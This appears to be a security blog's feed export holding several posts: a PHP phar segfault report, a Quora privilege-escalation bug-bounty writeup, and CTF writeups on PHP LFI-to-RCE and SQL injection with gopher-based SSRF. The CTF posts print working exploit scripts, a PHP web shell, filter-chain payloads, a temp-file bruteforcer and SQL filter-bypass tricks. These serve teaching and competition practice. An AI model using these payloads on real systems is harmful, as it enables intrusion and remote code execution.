class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;phar://test.phar&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><code>c.php</code> also includes test.phar:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;phar://test.phar&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;bye&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>And on running <code>a.php</code><br>Expected result is: <code>hellobyehey</code><br>Actual result is: <code>hello [1] Segmentation fault</code></p><h2 id="Screen-shots"><a href="#Screen-shots" class="headerlink" title="Screen-shots"></a>Screen-shots</h2><p><img src="/images/photos/php-bug1.0.png" alt="image"><br><img src="/images/photos/php-bug1.1.png" alt="image"><br><img src="/images/photos/php-bug1.2.png" alt="image"><br><img src="/images/photos/php-bug1.3.png" alt="image"><br><img src="/images/photos/php-bug1.4.png" alt="image">  </p><p>The bug was reported in bugs.php.net, you can see all the comments and description there, follow the following link: <a href="https://bugs.php.net/bug.php?id=77432">https://bugs.php.net/bug.php?id=77432</a>  </p><p>I hope you find this blog worth to read.  </p>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Bug </tag>
            
            <tag> PHP </tag>
            
            <tag> Segmentation-fault </tag>
            
            <tag> phar </tag>
            
            <tag> Null Pointer Dereference </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Horizontal Privilege Escalation on Quora which can compromise all users on Quora</title>
      <link href="/2019/02/26/horizontal-privilege-escalation-on-quora/"/>
      <url>/2019/02/26/horizontal-privilege-escalation-on-quora/</url>
      
        <content type="html"><![CDATA[<p>Hey, I am SpyD3r(<a href="https://twitter.com/TarunkantG">@TarunkantG</a>) and in this blog, I will be discussing the bug I have found in Quora which can compromise all users on Quora due to Horizontal Privilege Escalation.  </p><p>I worked more than 18 hrs a day and did it for a week to get familiar with all Quora functionality/workings, then finally I got two bugs 1 medium and 1 critical, here I will be discussing critical one only because I didn’t get the bounty for Medium one yet ;). It was really fun working with Quora because it has a lot of functionalities and this was my first bug (which comes out to be critical). I started finding the bug because I need to finance my site(<a href="https://spyclub.tech">https://spyclub.tech</a>) because subscription gonna end in March. Eventually, now I can take a subscription for 10 years, so let’s start.  </p><p>As I was testing each functionality, I was also figuring out which only thing can make a proper impact in the response like only <code>m-b</code> cookie is responsible for login, we can enumerate <code>uid</code> to get user details like Name, Profile pic etc.   </p><p>For enumerating <code>uid</code>, I figured out that we can do it from <code>kwargs</code>.<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">json=%7B%22args%22%3A%5B%5D%2C%22kwargs%22%3A%7B%22uid%22%3A123456%7D ...</span><br></pre></td></tr></table></figure><br>Changing the <code>uid</code> will let you know other user details. (BUT ONLY HERE?)<br>After digging more I also got to know that in the some of the places putting the <code>uid</code> on <code>args</code>, will also get you the same (COOL). Now let’s go forward.</p><p>When I was checking the functionality of sending the request for an Question, I saw this the request:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">js_init=%7B%22asked_uid%22%3A365110562%2C%22viewer%22%3A730730786</span><br></pre></td></tr></table></figure><br>Here, <code>asked_uid</code> is the <code>uid</code> of the person you asked and <code>viewer</code> is your <code>uid</code>, I tried changing viewer uid, but, obviously it didn’t worked(it’s not that easy IDOR). So I started checking here, which specific thing is responsible for telling that it’s me (Maybe I can overwrite that). My gut feeling was saying there can be a bug, because if we can enumerate <code>uid</code> to get the details, then why the same we can do here.<br>So I left this part here and went to find the solution for that, by checking other things. I observed that in the one place <code>uid</code> parameter is given at <code>kwargs</code>, then I remembered back that, we could have actually do it, yeah, then I went back and tried adding one more parameter(<code>uid</code>) in <code>kwargs</code>, but it didn’t worked, okay, now I tried with <code>args</code> and guess!! HURRAY!! The <code>uid</code> got overwrite.<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">json=%7B%22args%22%3A%5B&lt;PUT_VICTIM_UID&gt;%5D%2C%22kwargs%22%3A%7B ......</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>I was happy on that moment because this can be a bug because I can request for any Question to anyone on the Quora, also from account of most followed person, celeb etc.<br>I was doing this testing in my working days, so I had classes, so on the way to my college, one idea clicked that was, while giving Answer or Ask Question if I can overwrite <code>uid</code>. But the problem was I had to wait for 3hrs (because of my class). As the class ended, I ran for the lab, takeout the laptop and tried it and guess what!!! IT WORKED!!! I got the critical bug… Now, I can put answers to any questions, ask any questions from a different account.  </p><p>Instantly, I reported this bug through HackerOne to Quora and they fixed it in less than 4hrs and awarded me the bounty next day.  </p><p>Thanks for reading it, I hope you get fun reading.</p>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Bug </tag>
            
            <tag> Privilege-Escalation </tag>
            
            <tag> BugBounty </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Detailed writeup of both one line php and Return of one line php</title>
      <link href="/2018/12/21/one-line-and-return-of-one-line-php-writeup/"/>
      <url>/2018/12/21/one-line-and-return-of-one-line-php-writeup/</url>
      
        <content type="html"><![CDATA[<p>Hey, I am SpyD3r(<a href="https://twitter.com/TarunkantG">@TarunkantG</a>) and in this blog I will be discussing both challenge one line php and Return of one line php.<br>Both challenges were very interesting and got to learn alot of new things, so I decided to write a writeup on same, I have referred a lot of blogs to good catchup on these topic which I will be discussing in details.  </p><h2 id="Difference-between-these-two-challenge"><a href="#Difference-between-these-two-challenge" class="headerlink" title="Difference between these two challenge"></a>Difference between these two challenge</h2><p>There was a small difference between these two challenge, in the one line php it was given default php with version 7.2 and in Return of one line php, it was given default php with one change <code>session.upload_progress.enabled = Off</code> and this change made old exploit not working or say for avoiding the old exploit and create a new one.  </p><h2 id="One-line-PHP"><a href="#One-line-PHP" class="headerlink" title="One line PHP"></a>One line PHP</h2><p>This challenge was made by <a href="https://twitter.com/orange_8361">@orange</a>, you can find his writeup <a href="https://github.com/orangetw/My-CTF-Web-Challenges#one-line-php-challenge">here</a>.  </p><p><img src="/images/photos/blog2.1.png" alt="a"><br>As you can see source code, from this we can know that we only can include things which starts from <code>@&lt;php</code> and they said that this is default php, so we can’t includes remote files because <code>allow_url_include = Off</code> in default. Now what??<br>The wrapper we can use is <code>php://filter</code>, and <code>session.upload_progress.enabled = On</code> so if this, we can control partial session file by making a post request by this parameter <code>PHP_SESSION_UPLOAD_PROGRESS</code>. And will include this session file with LFI.<br>Because <code>session.upload_progress.cleanup = On</code> by default, what it do is, it deletes the session file as soon as it’s work is done. We will bypass this using <code>Race Condition</code>.<br>We can change the session file name by sending the cookie <code>PHPSESSID=something</code>, by this the session file name will be <code>sess_something</code>.<br>So Now we know the session file name, but what the content look like?<br>So lets create a session file and check the content, here is the code snippet for creating session file.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;PHPSESSID=tarunkant&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:  final_payload</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    fp = <span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    r = requests.post(HOST, files=&#123;<span class="string">&#x27;f&#x27;</span>: fp&#125;, data=data, headers=headers)</span><br><span class="line">    <span class="built_in">print</span> r.text</span><br><span class="line">    fp.close()</span><br></pre></td></tr></table></figure><br>It created the session file, lets look into it:<br><img src="/images/photos/blog2.2.png" alt="a"><br>As you can see our final_payload got prefix <code>upload_progress_</code>, but we wanted our file start from <code>@&lt;?php</code>, so we need to manipulate it. There are two ways to solve that challenge:  </p><h3 id="1st-way-Orange-way"><a href="#1st-way-Orange-way" class="headerlink" title="1st way (Orange way):"></a>1st way (Orange way):</h3><p>Base64 encode your payload 3 times then add prefix <code>ZZ</code> or <code>BB</code> or <code>xx</code> and while including session file, base64 decode 3 times through php filter wrapper.<br>Why prefix <code>ZZ</code> or else??<br>Base64 decoding 3 times <code>upload_progress_ZZ</code> gives you empty string.  </p><p><img src="/images/photos/blog2.3.png" alt="a"><br>So it will return your payload.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">final_payload = <span class="string">&#x27;ZZ&#x27;</span> + payload</span><br></pre></td></tr></table></figure><br>but this payload is 3 times base64-encoded of your payload. but remember every time you encode there should not be any <code>=</code> or <code>==</code>. There is code snippet for generating the same:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    junk = <span class="string">&#x27;&#x27;</span>.join(sample(string.ascii_letters, randint(<span class="number">8</span>, <span class="number">16</span>)))</span><br><span class="line">    x = b64encode(payload + junk)</span><br><span class="line">    xx = b64encode(b64encode(payload + junk))</span><br><span class="line">    xxx = b64encode(b64encode(b64encode(payload + junk)))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;=&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> x <span class="keyword">and</span> <span class="string">&#x27;=&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> xx <span class="keyword">and</span> <span class="string">&#x27;=&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> xxx:</span><br><span class="line">        payload=xxx</span><br><span class="line">        <span class="built_in">print</span> payload</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><br>Now is the time for RCE through Race Condition and LFI.<br>Now we need to make requests to include session file through LFI. there is code snippet for the same:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">filename = <span class="string">&#x27;/var/lib/php/sessions/sess_&#x27;</span> + sess_name</span><br><span class="line">filename = <span class="string">&#x27;php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s&#x27;</span> % filename</span><br><span class="line"><span class="built_in">print</span> filename</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    url = <span class="string">&#x27;%s?orange=%s&#x27;</span> % (HOST, filename)</span><br><span class="line">    r = requests.get(url, headers=headers)</span><br><span class="line">    c = r.content</span><br><span class="line">    <span class="keyword">if</span> c <span class="keyword">and</span> <span class="string">&#x27;orange&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> c:</span><br><span class="line">        <span class="built_in">print</span> [c]</span><br></pre></td></tr></table></figure><br>Run both code for creating the session file and including the session file at same time. Here is the full <a href="https://github.com/tarunkant/Automation/blob/master/RCE_through_include.py">exploit script</a>.  </p><p>Key points to solve:</p><ul><li>Control session file by <code>PHP_SESSION_UPLOAD_PROGRESS</code>.</li><li>Using PHP wrapper manipulate <code>upload_progress_</code>.</li><li>Get RCE through Race COndition and LFI.</li></ul><h3 id="2nd-way"><a href="#2nd-way" class="headerlink" title="2nd way:"></a>2nd way:</h3><p>This way is somewhat different from orange way, you can get writeup <a href="https://hackmd.io/s/B1A2JIjjm0">here</a>.<br>I will be using his POC here.<br>For decoding:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.iconv.UTF8.IBM1154|convert.base64-encode|convert.iconv.UCS-2LE.UCS-2BE|string.rot13|convert.base64-decode|string.rot13|convert.base64-encode||convert.iconv.UCS-2LE.UCS-2BE|string.rot13|convert.base64-decode|convert.iconv.UCS-2LE.UCS-2BE|convert.base64-encode|string.rot13|convert.base64-decode|convert.iconv.UCS-2LE.UCS-2BE|convert.base64-encode|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.UCS-4LE.UCS-4BE|convert.base64-decode|string.strip_tags|convert.iconv.CP1025.UTF8/resource=data://,upload_progress_</span><br></pre></td></tr></table></figure><br>For encoding:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.base64-encode|convert.iconv.UCS-4LE.UCS-4BE|convert.iconv.UCS-2LE.UCS-2BE|convert.base64-decode|convert.iconv.UCS-2LE.UCS-2BE|convert.base64-encode|string.rot13|convert.base64-decode|convert.iconv.UCS-2LE.UCS-2BE|convert.base64-encode|string.rot13|convert.iconv.UCS-2LE.UCS-2BE|convert.base64-decode|string.rot13|convert.base64-encode|string.rot13|convert.iconv.UCS-2LE.UCS-2BE|convert.base64-decode|convert.iconv.IBM1154.UTF8/resource=data://,xyz</span><br></pre></td></tr></table></figure><br>In this way we will encode our payload and using <code>PHP_SESSION_UPLOAD_PROGRESS</code> we will send it to server, this will make session file and using LFI we will decode through php filter wrapper.<br>So we need to encode our payload, but what will be??<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$payload</span> = <span class="string">&quot;&gt;&quot;</span> . iconv(<span class="string">&#x27;UTF8&#x27;</span>,<span class="string">&#x27;CP1025&#x27;</span>,<span class="string">&#x27;@&lt;?php eval($_GET[1]);?&gt;//aaa&#x27;</span>);</span><br></pre></td></tr></table></figure><br>Why do we need to pad with <code>&gt;</code> ??<br>Because<br><img src="/images/photos/blog2.4.png" alt="a"><br>Here you can see that after decoding <code>upload_progress_</code> it starts with <code>&lt;</code>, so we will close this and will do <code>string.strip_tags</code>, so that it will replace <code>upload_progress_</code> with empty string.<br>Why CP1025 encoding??<br>At last after <code>string.strip_tags</code> did his work, now decoding algo has <code>convert.iconv.CP1025.UTF8</code> for decoding that.<br>So finally we got our shell payload.  </p><p><img src="/images/photos/blog2.5.png" alt="a"><br><img src="/images/photos/blog2.6.png" alt="a"><br>Now we have to make POST request to<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?orange=php://filter/convert.iconv.UTF8.IBM1154|convert.base64-encode|convert.iconv.UCS-2LE.UCS-2BE|string.rot13|convert.base64-decode|string.rot13|convert.base64-encode||convert.iconv.UCS-2LE.UCS-2BE|string.rot13|convert.base64-decode|convert.iconv.UCS-2LE.UCS-2BE|convert.base64-encode|string.rot13|convert.base64-decode|convert.iconv.UCS-2LE.UCS-2BE|convert.base64-encode|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.UCS-4LE.UCS-4BE|convert.base64-decode|string.strip_tags|convert.iconv.CP1025.UTF8/resource=/var/lib/php/sessions/sess_tarunkant&amp;1=?&gt;&lt;?php system(ls);</span><br></pre></td></tr></table></figure><br>with data <code>PHP_SESSION_UPLOAD_PROGRESS</code> consisting our encoded payload.</p><h2 id="Return-of-One-line-PHP"><a href="#Return-of-One-line-PHP" class="headerlink" title="Return of One line PHP"></a>Return of One line PHP</h2><p>As I said earlier here in this challenge <code>session.upload_progress.enabled = Off</code>. Now what ??<br>There was one bug submitted a year ago, which was segmentation fault in php7.0 which can lead RCE (If we get LFI ;) ). you can get writeup <a href="https://www.jianshu.com/p/dfd049924258">here</a>.<br>POC<br><img src="/images/photos/blog2.7.png" alt="a"><br>This challenge is similar to this bug, but the php version given here was 7.2.<br>So need to find segmentation fault in 7.2, So here is the POC<br><img src="/images/photos/blog2.8.png" alt="a"><br>Here is the writeup how it got derived, <a href="https://hackmd.io/s/rJlfZva0m">here</a>.<br>Now what after getting segmentation fault, How will you get RCE through LFI using same ??<br>So everyone know that, when we upload a file, server make a temp file having same content as uploaded file and after some time it gets deleted, so what if php gets hang in between? cool, then our file won’t get delete. Then we can make request to that temp file using LFI to get RCE. How will you do that now?  </p><p>In while loop Make post request to<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure><br>And send shell file<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@<span class="meta">&lt;?php</span></span><br><span class="line">system(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;spyd3r&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">  url = base_url + <span class="string">&quot;/trial.php?file=php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span></span><br><span class="line">  files = &#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)&#125;</span><br><span class="line">  response = requests.post(url, files=files)</span><br></pre></td></tr></table></figure><p>Now we need to bruteforce for the temp file, Here is the full code.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">charset1 = string.digits + string.letters</span><br><span class="line">charset2 = charset[::-<span class="number">1</span>]</span><br><span class="line">charset3 = string.letters + string.digits</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line">base_url = <span class="string">&quot;http://%s:%d&quot;</span> % (host, port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bruteforce</span>(<span class="params">prefix,charset</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> charset:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> charset:</span><br><span class="line">                filename = prefix + i + j + k</span><br><span class="line">                url = <span class="string">&quot;%s/Trash/trial15.php?file=/tmp/php%s&quot;</span> % (base_url, filename)</span><br><span class="line">                <span class="built_in">print</span> url</span><br><span class="line">                response = requests.get(url)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;spyd3r&#x27;</span> <span class="keyword">in</span> response.content:</span><br><span class="line">                    <span class="built_in">print</span> <span class="string">&quot;[+] Include success!&quot;</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">2</span>):</span><br><span class="line">        threading.Thread(target=bruteforce,args=(<span class="string">&#x27;00&#x27;</span>+<span class="built_in">str</span>(i),charset1,)).start()</span><br><span class="line">        threading.Thread(target=bruteforce,args=(<span class="string">&#x27;00&#x27;</span>+<span class="built_in">str</span>(i),charset2,)).start()</span><br><span class="line">        threading.Thread(target=bruteforce,args=(<span class="string">&#x27;00&#x27;</span>+<span class="built_in">str</span>(i),charset3,)).start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><br>Both challenge was very interesting, really enjoyed…<br>I hope you guys found it good article and worth to read.<br>Thanks,</p>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Writeup </tag>
            
            <tag> RCE </tag>
            
            <tag> PHP </tag>
            
            <tag> LFI </tag>
            
            <tag> Race-Condition </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>InCTF-2018 Web challenges writeup</title>
      <link href="/2018/10/08/2018-10-08-inctf2018-web-challenge-writeup/"/>
      <url>/2018/10/08/2018-10-08-inctf2018-web-challenge-writeup/</url>
      
        <content type="html"><![CDATA[<p>Hey, I am SpyD3r(<a href="https://twitter.com/TarunkantG">@TarunkantG</a>) and in this blog I will be discussing both web challenges that I made for InCTF-2018 and also a lot of SQL, SSTI tricks, techniques.<br>The first challenge was GoSQL which had 2 solves in 36 hrs and the second challenge was TorPy which got 17 solves in 27 hrs.<br><!--break--></p><h2 id="GoSQL"><a href="#GoSQL" class="headerlink" title="GoSQL"></a>GoSQL</h2><p>This challenge is the best challenge I made till now, I hope you will learn a lot of new tricks and new ideas on SQL injection and MySQL.<br>This challenge had two phases, first you have to be admin for solving 1st phase then in the next phase you need to get RCE on the server. Now we will solve each phase one by one.<br>So in 1st phase, you have given a source code for doing SQL injection and hopefully you recognized:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqli_set_charset(<span class="variable">$conn</span>,<span class="string">&quot;utf8&quot;</span>);</span><br></pre></td></tr></table></figure><br>this meant that you can use unicodes, but what the use of that??<br>So now the 1st trick is:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;a&#x27;</span> <span class="operator">=</span> <span class="string">&#x27;à&#x27;</span>;   # will <span class="keyword">return</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><br><img src="/images/photos/blog1.0.png" alt="a"></p><p>2nd trick is very known that, you can bypass comments in SQL:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> login <span class="keyword">where</span> <span class="comment">/*!username=&#x27;tarunkant&#x27;*/</span>;</span><br></pre></td></tr></table></figure><br><img src="/images/photos/blog1.1.png" alt="a"></p><p>Now if you got to know that the blacklisting is not done properly and you can find it by just printing blacklist variable, then you have done half of the first phase, and here these things are not blocked:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">having</span>, <span class="keyword">insert</span>, <span class="number">0</span>, <span class="keyword">user</span></span><br></pre></td></tr></table></figure><br>Now the 3rd trick is there are a lot of alternatives can be found in MySQL, So here I will be stating some alternatives which are not blocked and you need to use it for solving this challenge:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">where</span>   : <span class="keyword">having</span></span><br><span class="line">substr  : <span class="keyword">insert</span></span><br><span class="line"><span class="operator">&lt;</span>space<span class="operator">&gt;</span> : <span class="operator">%</span><span class="number">0</span>a</span><br><span class="line">  <span class="operator">=</span>     : <span class="keyword">in</span></span><br></pre></td></tr></table></figure><br>So, the payload you will use for solving 1st phase is:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> inctf2018_chall_2 <span class="comment">/*!having*/</span> username<span class="operator">=</span><span class="string">&#x27;àdmin&#x27;</span></span><br></pre></td></tr></table></figure><br>URL:<code>http://18.219.221.225/?clause=!having&amp;name=àdmin</code>  </p><p>Now you will redirect to the 2nd phase of the challenge.<br>This phase has one functionality that you can cURL.<br>If you check then you will get that these things are blocked:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dict</span>|ftp|scp|ldap|data|php|ssh|file</span><br></pre></td></tr></table></figure><br>the thing is you can use Gopher.<br>As you know that Gopher can communicate with MySQL if the user is not protected with the password and condition matches with this challenge(as said in description) but you need know username of the MySQL. How?<br>So the 1st phase had SQL injection right? Means you can find username from there itself right?<br>here you can get the final script for finding the username:</p><p><a href="https://github.com/tarunkant/CTF/blob/master/InCTF18-GoSQL.py">GITHUB-Link</a></p><p>So, there are things or say alternatives I used for making this script:<br>As you see we can’t use <code>if</code> function, so the next trick comes out which is, you can use <code>sleep</code> function as <code>if</code> function.<br>so here is 4th trick:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> if((<span class="number">1</span><span class="operator">=</span><span class="number">1</span>),sleep(<span class="number">3</span>),<span class="keyword">null</span>);     # will sleep <span class="keyword">for</span> <span class="number">3</span> sec</span><br><span class="line"><span class="keyword">select</span> if((<span class="number">1</span><span class="operator">=</span><span class="number">0</span>),sleep(<span class="number">3</span>),<span class="keyword">null</span>);     # it will <span class="keyword">return</span> <span class="keyword">null</span></span><br><span class="line"><span class="keyword">select</span> sleep((<span class="number">1</span><span class="operator">=</span><span class="number">1</span>)<span class="operator">*</span><span class="number">3</span>);              # will sleep <span class="keyword">for</span> <span class="number">3</span> sec</span><br><span class="line"><span class="keyword">select</span> sleep((<span class="number">1</span><span class="operator">=</span><span class="number">0</span>)<span class="operator">*</span><span class="number">3</span>);              # its <span class="keyword">like</span> <span class="keyword">null</span></span><br></pre></td></tr></table></figure><br>5th trick:<br>If you can’t use Single quote while selecting in MySQL, then you can use binary or hex encoding, here <code>0x</code> is blocked so we will be using <code>0b</code><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;abcd&#x27;</span>;                              # will print abcd</span><br><span class="line"><span class="keyword">select</span> <span class="number">0</span>b01100001011000100110001101100100;  # will print abcd</span><br><span class="line"><span class="keyword">select</span> <span class="number">0x61626364</span>;                          # will print abcd</span><br></pre></td></tr></table></figure><br>And also I modified and used the findings of <code>insert</code> function by <a href="https://twitter.com/hayakudesu">@stypr</a> can be found <a href="https://gist.github.com/stypr/43fce10db9fa44b5f072442245d9e82e">here</a>.<br>I hope that you guys got the concept I used in my script.<br>We got username: <code>INCTF_SSRF@LOCALHOST</code>, if you know, user() returns <code>localhost</code> in small letters, so the final MySQL username is:  <code>inctf_ssrf</code><br>lets go forward to the challenge, Now we have MySQL username, now what??<br>We have to make gopher link from which we can communicate with MySQL, but how??<br>So here again I am announcing my tool <a href="https://github.com/tarunkant/Gopherus">Gopherus</a>, which generates gopher link for exploiting SSRF and gaining RCE in various servers like MySQL, FastCGI, Memcached, Redis, Zabbix and SMTP.<br>And you can get blog on the same <a href="https://spyclub.tech/2018/blog-on-gopherus/">here</a>.<br>So using this tool lets try to solve this phase.<br>So what you think flag will be in the database? lets check then  </p><style>* {box-sizing: border-box}body {font-family: Verdana, sans-serif; margin:0}.mySlides {display: none}img {vertical-align: middle;}.slideshow-container {  max-width: 1000px;  position: relative;  margin: auto;}.prev, .next {  cursor: pointer;  position: absolute;  top: 50%;  width: auto;  padding: 16px;  margin-top: -22px;  color: white;  font-weight: bold;  font-size: 18px;  transition: 0.6s ease;  border-radius: 0 3px 3px 0;}.next {  right: 0;  border-radius: 3px 0 0 3px;}.prev:hover, .next:hover {  